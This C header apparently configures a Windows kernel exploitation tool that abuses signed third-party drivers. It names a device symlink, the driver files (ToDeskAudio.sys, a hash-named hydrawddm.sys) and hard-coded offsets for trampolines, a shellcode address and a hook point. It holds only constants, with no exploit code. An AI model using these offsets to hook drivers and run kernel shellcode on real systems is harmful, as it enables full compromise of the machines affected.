#pragma once

#define SymLinkName L"\\\\.\\Hydra"


#define SystemModuleInformation 11

#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#define STATUS_INSUFFICIENT_RESOURCES ((NTSTATUS)0xC000009AL)
#define STATUS_NOT_FOUND ((NTSTATUS)0xC0000225L)

#define STATUS_SUCCESS 0

#define TO_DESK_TRAMPOLINE_CODE_OFFSET 0x27A8
#define TO_DESK_TRAMPOLINE_CODE_STAGE_2_OFFSET 0x29C4
#ifndef OFFSET_FOR_ORIGINAL_ASM_CODE_SAVE
#define OFFSET_FOR_ORIGINAL_ASM_CODE_SAVE 0x330
#endif
#define TO_DESK_SHELLCODE_ADDR 0x2AA0
#define TO_DESK_TRAMPOLINE_PIT_OFFSET 0x2B40

#define EXP_DRIVER_HOOK_POINT_OFFSET 0xA721

#define PLACE_HOLDER_DRIVER_NAME "rt640x64.sys"
#define TRAMPOLINE_DRV_NAME "kmhh_trampoline_sys.sys"
#define TO_DESK_DRIVER_NAME  "ToDeskAudio.sys"
#define EXP_DRIVER_NAME "e496fa000ab3f17eeb0e77851475dbc24688e41349257e47d3bab6cde806dd8c_hydrawddm.sys"

#define NTKRNL_NAME "ntoskrnl.exe"
#define NTKRNL_PATH "C:\\Windows\\System32\\" NTKRNL_NAME
#define DBG_EXPORT_FUNC "DbgPrompt"
#ifndef WIDEN2
#define WIDEN2(x) L##x
#endif

#ifndef ff25jmpsize
#define ff25jmpsize 6
#endif
#ifndef ff25_opcode_size
#define ff25_opcode_size 2
#endif
 
#ifndef TRAMPOLINE_PIT_OFFSET_STAGE_2_FUNC
#define TRAMPOLINE_PIT_OFFSET_STAGE_2_FUNC 0x110
#endif


#ifndef stage_0_xoreaxeaxret_size
#define stage_0_xoreaxeaxret_size 0x3
#endif


#ifndef stage_0_placeholder_size
#define stage_0_placeholder_size 0x8
#endif

#ifndef WIDEN
#define WIDEN(x) WIDEN2(x)
#endif
